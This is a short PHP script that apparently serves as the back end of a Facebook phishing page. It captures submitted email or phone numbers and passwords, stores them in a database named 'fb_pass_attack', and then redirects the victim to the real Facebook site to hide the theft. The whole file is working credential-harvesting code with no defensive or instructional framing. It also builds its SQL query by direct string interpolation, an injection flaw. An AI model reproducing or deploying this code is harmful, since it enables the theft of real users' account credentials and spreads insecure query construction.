<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the form data
    $uname = $_POST['email_phone'];
    $pass = $_POST['password'];

    // Validate and sanitize the input as necessary
    $uname = filter_var($uname, FILTER_SANITIZE_STRING);
    $pass = filter_var($pass, FILTER_SANITIZE_STRING);

    // Database connection (replace with your actual connection details)
    $conn = new mysqli("localhost", "root", "", "fb_pass_attack");
    
    // Check connection
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    // SQL query to insert form data into the database
    $sql = "INSERT INTO users (`email_phone`, `password`) VALUES ('$uname', '$pass')";

    // Execute query and check for success
    if ($conn->query($sql) === TRUE) {
        // If the insertion is successful, redirect to Facebook's website
        header("Location: https://www.facebook.com");
        exit(); // Make sure the script stops after redirection
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }

    // Close the database connection
    $conn->close();
}
?>
